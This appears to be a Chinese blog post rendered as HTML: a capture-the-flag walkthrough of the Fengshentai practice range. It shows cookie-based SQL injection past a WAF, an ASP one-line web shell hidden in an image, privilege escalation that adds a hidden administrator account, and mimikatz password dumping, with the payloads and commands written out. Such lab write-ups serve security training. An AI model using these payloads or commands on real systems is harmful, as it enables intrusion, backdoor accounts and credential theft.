@@ -1,0 +1,774 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="奇怪的奇怪">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="尤里的复仇Ⅰ 小芳！第二章，sql绕waf进入环境，是一个新闻门户站点击一条新闻，因为一般新闻页面的功能都是与数据库进行交互的。 1http:&#x2F;&#x2F;g8wepfcp.ia.aqlab.cn&#x2F;shownews.asp?id&#x3D;171 我们可以得知，是网站下的shownews.asp这个ASP动态网页文件，与数据库进行交互，并查询出了id为171的新闻的值 ASPASP 即 Active Server P">
+<meta property="og:type" content="article">
+<meta property="og:title" content="封神台靶场复现">
+<meta property="og:url" content="http://example.com/2024/12/16/fenshengtai/index.html">
+<meta property="og:site_name" content="奇怪的亚索">
+<meta property="og:description" content="尤里的复仇Ⅰ 小芳！第二章，sql绕waf进入环境，是一个新闻门户站点击一条新闻，因为一般新闻页面的功能都是与数据库进行交互的。 1http:&#x2F;&#x2F;g8wepfcp.ia.aqlab.cn&#x2F;shownews.asp?id&#x3D;171 我们可以得知，是网站下的shownews.asp这个ASP动态网页文件，与数据库进行交互，并查询出了id为171的新闻的值 ASPASP 即 Active Server P">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/D92380ABDE2E4097B6FAA6FF85D057DA.png">
+<meta property="og:image" content="http://example.com/images/1B21A68F11334f7A5000C9E5AA06308.png">
+<meta property="og:image" content="http://example.com/images/416B657741344a3e92E4C89D1BCC8F87.png">
+<meta property="og:image" content="http://example.com/images/E851C5B483D1411f81E25D0283AD5439.png">
+<meta property="og:image" content="http://example.com/images/4B3056F4356A4df39158AC705D2B5316.png">
+<meta property="og:image" content="http://example.com/images/A7009965F97C47de9209D1EF72861D4C.png">
+<meta property="og:image" content="http://example.com/images/0465AE3225274362BFF10B3803E56BA8.png">
+<meta property="og:image" content="http://example.com/images/EE70F01A2CF9460c99889A43541F1968.png">
+<meta property="og:image" content="http://example.com/images/171E37DBE7E942b88F9083A71A2300C4.png">
+<meta property="og:image" content="http://example.com/images/4CC482D51E504baf98F68832DE37D5C5.png">
+<meta property="og:image" content="http://example.com/images/20873E0BD9FD47c7AA06C26D7E11DC96.png">
+<meta property="og:image" content="http://example.com/images/1C5CCFD83E0B4eacAE930BACC0BE465A.png">
+<meta property="og:image" content="http://example.com/images/C24A11FC925E43adACF482E52B91510E.png">
+<meta property="og:image" content="http://example.com/images/32C968C4DE2C443393EBB619D954CB4B.png">
+<meta property="og:image" content="http://example.com/images/0741E13EB6CF4960879B848A208886A7.png">
+<meta property="og:image" content="http://example.com/images/776A89A4847B4043B06AC2E2D280D3D3.png">
+<meta property="og:image" content="http://example.com/images/B8FA3DAB5EDE4b2fB5028ABB4C50256F.png">
+<meta property="og:image" content="http://example.com/images/C031DD4241BF4554BDC84BE1C4508AE2.png">
+<meta property="og:image" content="http://example.com/images/514A68E915014143A3D59C5ECA092E88.png">
+<meta property="og:image" content="http://example.com/images/4006F491104C45c6AE00E574585E7645.png">
+<meta property="og:image" content="http://example.com/images/A3C688303407477a9311927D7C29EFE6.png">
+<meta property="og:image" content="http://example.com/images/6444608F2EFC413e8E0ACD44ED8E6BA9.png">
+<meta property="og:image" content="http://example.com/images/D5104C0949514c08836603BF33627B3F.png">
+<meta property="og:image" content="http://example.com/images/F83CD31294514d0f8DBC366FEC8804BE.png">
+<meta property="og:image" content="http://example.com/images/F097E65ED72E493cB64A127C8DE4F778.png">
+<meta property="og:image" content="http://example.com/images/AC1EBCBC3D0D4050AAC5315B05A573D8.png">
+<meta property="og:image" content="http://example.com/images/0D5DDA74DF9041f295EC34DB36243D22.png">
+<meta property="og:image" content="http://example.com/images/3052FAAEB2E147ae868817AD4874C621.png">
+<meta property="og:image" content="http://example.com/images/F889D38DFF8A4697BEFF79ACDDB100F9.png">
+<meta property="og:image" content="http://example.com/images/39746C4F489A41e5922B9F8E1091BA9F.png">
+<meta property="og:image" content="http://example.com/images/D6BBE145F6AE4566BE2738B447AB6D60.png">
+<meta property="og:image" content="http://example.com/images/70BE8D26722A4b4c96006EA863CA4BA8.png">
+<meta property="og:image" content="http://example.com/images/38AE5CF3F9E248b78FD6398BA46A3EA4.png">
+<meta property="og:image" content="http://example.com/images/B239258F42A7483eA97CE43AC1871C6B.png">
+<meta property="og:image" content="http://example.com/images/7D812915E365434eB4D33329B8B51647.png">
+<meta property="og:image" content="http://example.com/images/3C8FA8D47D7C4fc0A261230D79E54C33.png">
+<meta property="og:image" content="http://example.com/images/640216B0FBD14d3bADC7C135B00B02F8.png">
+<meta property="og:image" content="http://example.com/images/658AF2E57EFE4e93B9021189B891A59E.png">
+<meta property="og:image" content="http://example.com/images/5A3E7A40A88949748E9B6FA83B49A5C8.png">
+<meta property="og:image" content="http://example.com/images/FD3B21B40B0142b68A63A3DEAA1EC233.png">
+<meta property="og:image" content="http://example.com/images/B5E9CA7153034e66B535B234DE803A09.png">
+<meta property="og:image" content="http://example.com/images/7E878505B5044c01B6421772B3B07FE4.png">
+<meta property="og:image" content="http://example.com/images/E04FCC621E704c00AE178B20E330257B.png">
+<meta property="og:image" content="http://example.com/images/E1F362BDBF0845639705CC32D4207F1C.png">
+<meta property="og:image" content="http://example.com/images/C1A0CBAD53944b1096A75C6EC2697FA9.png">
+<meta property="article:published_time" content="2024-12-15T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-23T15:14:44.869Z">
+<meta property="article:author" content="奇怪的奇怪">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/D92380ABDE2E4097B6FAA6FF85D057DA.png">
+  
+  
+  
+  <title>封神台靶场复现 - 奇怪的亚索</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","app_key":"2jVxSBuNhzKC1JEOZN2aZTgr","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>奇怪的亚索</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="封神台靶场复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-16 00:00" pubdate>
+          2024年12月16日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">封神台靶场复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="尤里的复仇Ⅰ-小芳！"><a href="#尤里的复仇Ⅰ-小芳！" class="headerlink" title="尤里的复仇Ⅰ 小芳！"></a>尤里的复仇Ⅰ 小芳！</h1><h2 id="第二章，sql绕waf"><a href="#第二章，sql绕waf" class="headerlink" title="第二章，sql绕waf"></a>第二章，sql绕waf</h2><p>进入环境，是一个新闻门户站<br><img src="/images/D92380ABDE2E4097B6FAA6FF85D057DA.png" srcset="/img/loading.gif" lazyload><br>点击一条新闻，因为一般新闻页面的功能都是与数据库进行交互的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://g8wepfcp.ia.aqlab.cn/shownews.asp?<span class="hljs-built_in">id</span>=171<br></code></pre></td></tr></table></figure>
+<p>我们可以得知，是网站下的shownews.asp这个ASP动态网页文件，与数据库进行交互，并查询出了id为171的新闻的值</p>
+<h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h3><p>ASP 即 Active Server Pages，是微软开发的一种服务器端脚本环境。ASP 文件是包含服务器端脚本代码（通常是 VBScript 或 JScript）的文本文件，其文件扩展名为.asp。这些文件在服务器上执行，生成动态的网页内容发送给客户端浏览器。<br>它会处理文件中的脚本代码，这些脚本代码可以与服务器的资源（如数据库、文件系统等）进行交互。例如，脚本可以从数据库中查询数据，根据查询结果动态地生成 HTML 内容。</p>
+<p>接下来我们尝试注入，拼接sql语句<br><img src="/images/1B21A68F11334f7A5000C9E5AA06308.png" srcset="/img/loading.gif" lazyload><br>可以看到有waf，不能用and，直接使用order by<br><img src="/images/416B657741344a3e92E4C89D1BCC8F87.png" srcset="/img/loading.gif" lazyload><br>查询当前表有10个字段，当到11的时候，页面出现错误，并返回数据库错误，证明此页面存在sql注入，同时测试出此表有10个字段。<br>我们继续注入，通过from，看页面返回是否正常猜测有无admin这个表<br><img src="/images/E851C5B483D1411f81E25D0283AD5439.png" srcset="/img/loading.gif" lazyload><br>又被waf了，测试出被waf的字符串为select，且不能绕过<br>既然get方式waf限制严格，因为网页防护一般之拦截Get、POST传参，我们采用cookie注入，当然POST也可以，比GET松但是相对严格。<br><img src="/images/4B3056F4356A4df39158AC705D2B5316.png" srcset="/img/loading.gif" lazyload><br>我们发现此方法可行，成功显示了页面，GET没有id<br>证明了cookie里的id&#x3D;171，也能正常传参，被当作SQL语句拼接，那我们直接进行注入<br>我们输入cookie的值为</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">171</span>+union+select+<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>+from+admin<br></code></pre></td></tr></table></figure>
+<p>继续猜测是否存在admin表，空格需用+代替，不然会出错<br><img src="/images/A7009965F97C47de9209D1EF72861D4C.png" srcset="/img/loading.gif" lazyload><br>页面回显了2，3，7，8，9<br>没有出现数据库错误，这证明admin表是存在的。且第2、3、7、8、9字段，可以用来猜测字段名，并回显到页面上<br>我们接着尝试猜测最常见的管理表字段名username和password，我们在上面的值任选两个<br><img src="/images/0465AE3225274362BFF10B3803E56BA8.png" srcset="/img/loading.gif" lazyload><br>返回了账号密码<br>密码是字母加数字的16位组合，看下是不是MD5<br><img src="/images/EE70F01A2CF9460c99889A43541F1968.png" srcset="/img/loading.gif" lazyload><br>知道了密码明文<br>此环境用的是南方CMS，默认管理员后台是根目录的&#x2F;admin&#x2F;<br><img src="/images/171E37DBE7E942b88F9083A71A2300C4.png" srcset="/img/loading.gif" lazyload><br>进入后台，拿到flag</p>
+<h2 id="第四章，进击！拿到Web最高权限！"><a href="#第四章，进击！拿到Web最高权限！" class="headerlink" title="第四章，进击！拿到Web最高权限！"></a>第四章，进击！拿到Web最高权限！</h2><p><img src="/images/4CC482D51E504baf98F68832DE37D5C5.png" srcset="/img/loading.gif" lazyload><br>进入环境，需要管理员cookie<br><img src="/images/20873E0BD9FD47c7AA06C26D7E11DC96.png" srcset="/img/loading.gif" lazyload><br>提取上一题提取的cookie<br><img src="/images/1C5CCFD83E0B4eacAE930BACC0BE465A.png" srcset="/img/loading.gif" lazyload><br>进入管理后台<br><img src="/images/C24A11FC925E43adACF482E52B91510E.png" srcset="/img/loading.gif" lazyload><br>添加产品位置可以上传文件<br>上传一个php文件，出现提示<br><img src="/images/32C968C4DE2C443393EBB619D954CB4B.png" srcset="/img/loading.gif" lazyload><br>可以在网站配置看到允许上传的文件类型，但不可以更改<br><img src="/images/0741E13EB6CF4960879B848A208886A7.png" srcset="/img/loading.gif" lazyload><br>通过url可以看出本站用的是asp语言<br><img src="/images/776A89A4847B4043B06AC2E2D280D3D3.png" srcset="/img/loading.gif" lazyload><br>可能存在IIS解析漏洞：IIS6.0默认的可执行文件除了asp还包括这三种，*.asa *.cer *.cdx<br>所以对比上面的我们可以上传.cer文件，写入asp语言的一句话木马</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&lt;<span class="hljs-meta">%</span>eval request<span class="hljs-comment">(&quot;cmd&quot;)</span><span class="hljs-meta">%</span>&gt;<br></code></pre></td></tr></table></figure>
+<p><img src="/images/B8FA3DAB5EDE4b2fB5028ABB4C50256F.png" srcset="/img/loading.gif" lazyload><br>看来不能直接上传.cer文件<br>上传图片马<br>先找一张正常的图片，大小小一点的</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">copy</span> <span class="hljs-number">24</span>.jpg/b+<span class="hljs-number">1</span>.cer <span class="hljs-number">2</span>.jpg<br><span class="hljs-comment">#复制 原图片/二进制格式+木马.cer #新图片</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/C031DD4241BF4554BDC84BE1C4508AE2.png" srcset="/img/loading.gif" lazyload><br>用记事本查看木马图片<br><img src="/images/514A68E915014143A3D59C5ECA092E88.png" srcset="/img/loading.gif" lazyload><br>末尾发现一句话木马代表成功生成，且图片正常显示<br>把2.jpg改为2.cer上传<br><img src="/images/4006F491104C45c6AE00E574585E7645.png" srcset="/img/loading.gif" lazyload><br>蚁剑连接<br><img src="/images/A3C688303407477a9311927D7C29EFE6.png" srcset="/img/loading.gif" lazyload><br>找到flag<br><img src="/images/6444608F2EFC413e8E0ACD44ED8E6BA9.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="第五章：SYSTEM！POWER！"><a href="#第五章：SYSTEM！POWER！" class="headerlink" title="第五章：SYSTEM！POWER！"></a>第五章：SYSTEM！POWER！</h2><p><img src="/images/D5104C0949514c08836603BF33627B3F.png" srcset="/img/loading.gif" lazyload><br>利用第四章的文件上传漏洞我们获得了一个普通的shell，现在我们要做的是提权，获得c盘的flag<br>上传木马后，我们用菜刀连接(蚁剑本题提权操作有问题)<br><img src="/images/F83CD31294514d0f8DBC366FEC8804BE.png" srcset="/img/loading.gif" lazyload><br>打开c盘下的flag.txt，没有权限<br><img src="/images/F097E65ED72E493cB64A127C8DE4F778.png" srcset="/img/loading.gif" lazyload><br>没有权限的话，我们能够想到命令行cmd，是个提权的好方法，返回菜刀目录，右键打开虚拟终端，看看whoami显示是什么<br><img src="/images/AC1EBCBC3D0D4050AAC5315B05A573D8.png" srcset="/img/loading.gif" lazyload><br>拒绝访问，所以我们要找到能利用的点<br>打开D盘目录RECYCLER文件夹<br>recycler(根文件)是windows系列操作系统所用的文件夹，其主要用途是放置被用户删除的文件，这里我们看到有cmd.exe,iis6.exe,这就是我们要利用的病毒文件<br><img src="/images/0D5DDA74DF9041f295EC34DB36243D22.png" srcset="/img/loading.gif" lazyload><br>从cmd.exe进入虚拟终端<br><img src="/images/3052FAAEB2E147ae868817AD4874C621.png" srcset="/img/loading.gif" lazyload><br>查看whoami，我们是普通用户<br><img src="/images/F889D38DFF8A4697BEFF79ACDDB100F9.png" srcset="/img/loading.gif" lazyload><br>提权</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">iis6<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/39746C4F489A41e5922B9F8E1091BA9F.png" srcset="/img/loading.gif" lazyload><br>现在就为系统权限了</p>
+<p>用它创建账号账号：a ，密码：1</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">iis6<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;net user a 1 /add&quot;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/D6BBE145F6AE4566BE2738B447AB6D60.png" srcset="/img/loading.gif" lazyload></p>
+<p>创建成功以后对账号提权至Administrator组</p>
+<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">iis6.exe <span class="hljs-comment">&quot;net localgroup Administrators a /add&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>查看新建账号a的权限，成功获得最高权限</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">iis6<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;net user a&quot;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/70BE8D26722A4b4c96006EA863CA4BA8.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在a账号是最高权限组<br>我们接下来要做的就是远程连接<br>用tasklist -svc命令查看了这台服务器开启的服务，发现远程桌面服务Termservice的pid是2408<br><img src="/images/38AE5CF3F9E248b78FD6398BA46A3EA4.png" srcset="/img/loading.gif" lazyload><br>再使用netstat -ano查看端口和连接状态，显示pid&#x3D;2408所对应的端口号是3389，状态是正在监听，是打开着的，也就是说远程桌面服务器的端口号是3389<br><img src="/images/B239258F42A7483eA97CE43AC1871C6B.png" srcset="/img/loading.gif" lazyload><br>远程桌面连接<br>题目的ip地址+port端口连接其服务器<br><img src="/images/7D812915E365434eB4D33329B8B51647.png" srcset="/img/loading.gif" lazyload><br>打开c盘的flag.txt<br><img src="/images/3C8FA8D47D7C4fc0A261230D79E54C33.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="第六章：GET-THE-PASS！"><a href="#第六章：GET-THE-PASS！" class="headerlink" title="第六章：GET THE PASS！"></a>第六章：GET THE PASS！</h2><p><img src="/images/640216B0FBD14d3bADC7C135B00B02F8.png" srcset="/img/loading.gif" lazyload><br>接着上一关，利用远程登录后看到有两个疑似藏有flag信息的文件。<br><img src="/images/658AF2E57EFE4e93B9021189B891A59E.png" srcset="/img/loading.gif" lazyload><br>试着打开发现没有权限<br><img src="/images/5A3E7A40A88949748E9B6FA83B49A5C8.png" srcset="/img/loading.gif" lazyload><br>打开txt文件的属性-安全-高级，把权限全部都改成允许<br><img src="/images/FD3B21B40B0142b68A63A3DEAA1EC233.png" srcset="/img/loading.gif" lazyload><br>然后读取txt，解压密码是管理员密码<br><img src="/images/B5E9CA7153034e66B535B234DE803A09.png" srcset="/img/loading.gif" lazyload><br>打开zip文件发现需要解压密码，解压密码是管理员密码<br><img src="/images/7E878505B5044c01B6421772B3B07FE4.png" srcset="/img/loading.gif" lazyload><br>密码获取工具mimikatz(内网渗透神器)，直接在文件里面搜索，双击exe打开<br><img src="/images/E04FCC621E704c00AE178B20E330257B.png" srcset="/img/loading.gif" lazyload><br>输入命令</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">privilege::<span class="hljs-built_in">debug</span> <span class="hljs-comment">----提升权限</span><br>sekurlsa::logonPasswords<span class="hljs-comment">----获取登陆用户密码</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/E1F362BDBF0845639705CC32D4207F1C.png" srcset="/img/loading.gif" lazyload><br>获得密码wow!yougotit!<br>用这个密码输入到小芳.txt<br><img src="/images/C1A0CBAD53944b1096A75C6EC2697FA9.png" srcset="/img/loading.gif" lazyload><br>FLAG{WOW!yougotit!}</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>封神台靶场复现</div>
+      <div>http://example.com/2024/12/16/fenshengtai/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>奇怪的奇怪</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年12月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/01/28/thinkphp%E6%A1%86%E6%9E%B6%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="thinkphp框架的简单使用">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">thinkphp框架的简单使用</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/24/CTFshow_DSBCTF2024/" title="DSBCTF2024">
+                        <span class="hidden-mobile">DSBCTF2024</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","appKey":"2jVxSBuNhzKC1JEOZN2aZTgr","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
